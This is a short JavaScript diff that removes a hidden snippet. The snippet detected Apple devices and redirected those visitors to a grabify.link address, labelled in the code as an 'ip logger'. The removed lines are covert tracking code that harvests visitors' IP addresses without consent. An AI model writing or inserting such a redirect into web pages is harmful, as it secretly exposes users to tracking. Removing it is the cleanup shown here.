@@ -32,13 +32,5 @@ let _main_globals = {      // Prevents polluting global namespace
         console.log("Hello, World!");
     };
 
-    // Check if user is on an apple device
-    _main_globals.variables["is_apple"] = /Mac|iPod|iPhone|iPad/.test(navigator.platform);
-
-    if (_main_globals.variables["is_apple"]) {
-        // Redirect to ip logger if on apple device
-        window.location.href = "https://grabify.link/GM0ZFZ";
-    }
-
     _main_globals = _main_globals; // Export the globals to window, making it global.
 })(); // Call the function with ()
